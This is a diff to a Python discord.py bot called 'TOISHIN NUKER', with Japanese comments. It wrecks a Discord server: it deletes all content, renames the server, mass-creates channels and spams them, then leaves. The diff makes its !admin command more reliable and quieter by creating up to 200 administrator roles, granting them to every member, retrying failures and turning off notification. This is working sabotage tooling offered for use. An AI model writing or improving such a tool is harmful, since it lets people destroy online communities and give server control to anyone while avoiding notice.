@@ -4,9 +4,13 @@
   TOISHIN NUKER  -  垢飛ばしツール (discord.py)
 ================================================================
   !toishin  ->  全削除 → 改名 → 100ch作成 → 100msg×100ch → 退出
-  !admin    ->  全員に管理者ロール50個付与 (退出しない)
+  !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
+================================================================
+  必要な環境変数: DISCORD_TOKEN
+  必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
 ================================================================
 """
+
 import asyncio
 import logging
 import os
@@ -42,9 +46,11 @@ CREATE_CONCURRENCY   = 20       # 作成の並列度
 
 ADMIN_ROLE_COUNT     = 50       # !admin で付与する管理者ロール数
 ROLE_CONCURRENCY     = 8
-MEMBER_CONCURRENCY   = 5
+MEMBER_CONCURRENCY   = 8
 
-GUILD_ICON_URL       = None     # アイコンURLを変えたい時だけ入れる (Noneで据え置き)
+GUILD_ICON_URL       = None     # アイコンを変えたい時だけURLを入れる (Noneで据え置き)
+
+ADMIN_NOTIFY         = False    # !admin 実行時にチャンネルへ結果を送るか
 
 # 送信する本文
 NUKE_MESSAGE = (
@@ -214,7 +220,7 @@ bot = commands.Bot(
 NUKE_LOCK = asyncio.Lock()
 
 
-# =========================== 本体 ===========================
+# ========================= ヌケ本体 =========================
 async def run_nuke(guild: discord.Guild) -> None:
     t0 = time.perf_counter()
     el = lambda: f"{time.perf_counter() - t0:.1f}s"
@@ -290,39 +296,52 @@ async def run_nuke(guild: discord.Guild) -> None:
 @commands.guild_only()
 async def toishin(ctx: commands.Context):
     if NUKE_LOCK.locked():
-        await safe(ctx.channel.send, "🚀 ヌケ実行中だよ、ちょい待ち", label="busy")
-        return
+        return                      # ヌケ中は黙って無視(二重ヌケ防止)
     async with NUKE_LOCK:
         await run_nuke(ctx.guild)
 
 
-# ===================== !admin (退出しない) =====================
-@bot.command(name="admin", aliases=["adm"])
-@commands.guild_only()
-async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
-    guild = ctx.guild
-    count = max(1, min(count, 200))
-    t0 = time.perf_counter()
-    log.info("=== ADMIN START | %s ===", guild.name)
+# ==================== !admin 用ヘルパー ====================
+async def notify(ctx: commands.Context, content: str) -> None:
+    """ADMIN_NOTIFY が True の時だけチャンネルへ送る"""
+    if ADMIN_NOTIFY:
+        await safe(ctx.channel.send, content, label="adm:reply")
 
-    # メンバーを全キャッシュ
+
+async def collect_members(guild: discord.Guild) -> list[discord.Member]:
+    """全メンバーを確実に集める (キャッシュ -> fetch_members -> chunk)"""
+    members = list(guild.members)
+    if guild.member_count and len(members) >= guild.member_count:
+        return members
+
     try:
-        async for _ in guild.fetch_members(limit=None):
-            pass
-    except Exception:
-        log.warning("fetch_members 失敗 (メンバー一覧が不完全かも)")
+        async for m in guild.fetch_members(limit=None):
+            if m not in members:
+                members.append(m)
+    except Exception as e:
+        log.warning("fetch_members 失敗: %s", e)
 
-    # 既存の同系ロールは再利用(二度打ちしても増殖しない)
+    if len(members) < (guild.member_count or 0):
+        try:
+            await guild.chunk()
+            members = list(guild.members)
+        except Exception as e:
+            log.warning("chunk 失敗: %s", e)
+
+    return members
+
+
+async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
+    """管理者ロールを必要数用意。既存の同系ロールは再利用(二度打ちで増殖しない)"""
     pool = {r.name: r for r in guild.roles
             if r.name.startswith("ADMIN-") and r.permissions.administrator}
-
-    sem_r = asyncio.Semaphore(ROLE_CONCURRENCY)
+    sem = asyncio.Semaphore(ROLE_CONCURRENCY)
 
     async def ensure(i: int):
         nm = f"ADMIN-{i:02d}"
         if nm in pool:
             return pool[nm]
-        async with sem_r:
+        async with sem:
             return await safe(
                 guild.create_role, name=nm,
                 permissions=discord.Permissions(administrator=True),
@@ -330,27 +349,95 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
                 reason="TOISHIN ADMIN", label=f"role:{nm}",
             )
 
-    roles = [r for r in await asyncio.gather(*(ensure(i) for i in range(1, count + 1))) if r]
-    log.info("ロール %d 個 準備完了", len(roles))
+    got = await asyncio.gather(*(ensure(i) for i in range(1, count + 1)))
+    return [r for r in got if r is not None]
 
-    sem_m = asyncio.Semaphore(MEMBER_CONCURRENCY)
-    done = 0
 
-    async def grant(m: discord.Member):
-        nonlocal done
+async def grant_roles(members: list[discord.Member],
+                      roles: list[discord.Role]) -> tuple[int, list[discord.Member]]:
+    """全員にロールを付与。一括PUT -> 失敗時は1個ずつ -> 最後に検証"""
+    sem = asyncio.Semaphore(MEMBER_CONCURRENCY)
+
+    async def grant(m: discord.Member) -> bool:
         need = [r for r in roles if r not in m.roles]
         if not need:
-            return
-        async with sem_m:
-            await safe(m.add_roles, *need, reason="TOISHIN ADMIN", label=f"grant:{m}")
-        done += 1
+            return True
 
-    await asyncio.gather(*(grant(m) for m in guild.members))
-    log.info("=== ADMIN END | %d 人に %d ロール付与 | %.1fs ===",
-             done, len(roles), time.perf_counter() - t0)
-    await safe(ctx.channel.send,
-               f"✅ 全員に管理者ロール {len(roles)} 個を付与したよ (botは残る)",
-               label="adm:reply")
+        async with sem:
+            # 1人1リクエストで一括付与
+            await safe(m.add_roles, *need, atomic=True,
+                       reason="TOISHIN ADMIN", label=f"grant:{m}")
+
+            # 取りこぼしがあれば1個ずつフォールバック
+            for r in [x for x in need if x not in m.roles]:
+                await safe(m.add_roles, r, reason="TOISHIN ADMIN",
+                           label=f"grant1:{m}:{r.name}")
+
+            # 最終検証: 全ロールを持っているか
+            return all(r in m.roles for r in roles)
+
+    results = await asyncio.gather(*(grant(m) for m in members))
+    ok = sum(1 for r in results if r)
+    failed = [m for m, r in zip(members, results) if not r]
+    return ok, failed
+
+
+# ========================= !admin =========================
+@bot.command(name="admin", aliases=["adm"])
+@commands.guild_only()
+async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
+    guild = ctx.guild
+    count = max(1, min(count, 200))
+    t0 = time.perf_counter()
+    log.info("=== ADMIN START | %s (%s) | %d roles ===", guild.name, guild.id, count)
+
+    # 0) メンバーを全員取り切る
+    members = await collect_members(guild)
+    log.info("対象メンバー: %d 人 (member_count=%s)", len(members), guild.member_count)
+    if not members:
+        log.warning("メンバーを1人も取得できなかった。SERVER MEMBERS INTENT を確認")
+        await notify(ctx, "⚠ メンバーを1人も取得できなかった")
+        return
+
+    # 1) 管理者ロールを用意
+    roles = await ensure_admin_roles(guild, count)
+    log.info("ロール %d 個 準備完了", len(roles))
+    if not roles:
+        log.warning("ロールを作成できなかった(Manage Roles 権限を確認)")
+        await notify(ctx, "⚠ ロールを作成できなかった")
+        return
+
+    # Botの最上位ロールより上のロールは付与できないので押し下げる
+    top = guild.me.top_role
+    above = [r for r in roles if r >= top]
+    if above:
+        log.warning("Botの最上位ロール(%s)より上に %d 個。position を下げる",
+                    top.name, len(above))
+        for r in above:
+            await safe(r.edit, position=1, label=f"role:move:{r.name}")
+
+    # 2) 全員に付与
+    ok, failed = await grant_roles(members, roles)
+    log.info("付与 1周目: 成功 %d / 失敗 %d", ok, len(failed))
+
+    # 3) 失敗者はもう一度
+    if failed:
+        log.info("失敗者 %d 人をリトライ", len(failed))
+        await asyncio.sleep(1.0)
+        ok2, failed = await grant_roles(failed, roles)
+        ok += ok2
+
+    # 4) 最終確認
+    still = [m for m in members if not all(r in m.roles for r in roles)]
+    log.info("=== ADMIN END | 成功 %d / 残り %d 人 / %.1fs ===",
+             ok, len(still), time.perf_counter() - t0)
+
+    if still:
+        names = ", ".join(m.display_name for m in still[:10])
+        log.info("未付与: %s", names)
+
+    await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
+                      f"(対象 {len(members)} 人 / 成功 {ok} 人)")
 
 
 # =========================== おまけ ===========================
@@ -384,4 +471,15 @@ async def on_command_error(ctx, error):
 if __name__ == "__main__":
     if not TOKEN:
         raise SystemExit("環境変数 DISCORD_TOKEN が未設定です")
-    bot.run(TOKEN, reconnect=True)
+    try:
+        bot.run(TOKEN, reconnect=True)
+    except discord.PrivilegedIntentsRequired:
+        log.error("=" * 60)
+        log.error("特権インテントがDeveloper PortalでOFFです")
+        log.error("Botページ -> Privileged Gateway Intents で")
+        log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
+        log.error("を両方ONにして Save -> 再起動してください")
+        log.error("https://discord.com/developers/applications/%s/bot",
+                  bot.application_id or "APP_ID")
+        log.error("=" * 60)
+        raise SystemExit(1)
